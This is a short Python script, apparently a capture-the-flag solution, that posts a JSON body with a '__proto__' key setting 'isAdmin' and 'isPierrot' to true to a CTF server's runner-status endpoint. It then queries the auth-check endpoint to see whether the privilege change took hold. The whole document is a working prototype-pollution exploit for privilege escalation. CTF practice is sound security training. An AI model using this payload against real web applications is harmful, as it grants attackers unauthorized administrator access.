import requests

url = "http://instance.ctf.it.kmitl.ac.th:5173/api/v1/update-runner-status"

# We want to pollute the Object prototype.
headers = {
    "Content-Type": "application/json"
}
data = {
    "nickname": "Runner",
    "stats": {},
    "__proto__": {
        "isPierrot": True,
        "isAdmin": True
    }
}

import json
res = requests.post(url, headers=headers, data=json.dumps(data))
print("Status:", res.status_code)
print("Response:", res.text)

# Check if auth-check changed
res = requests.get("http://instance.ctf.it.kmitl.ac.th:5173/api/v1/auth-check")
print("Auth:", res.text)
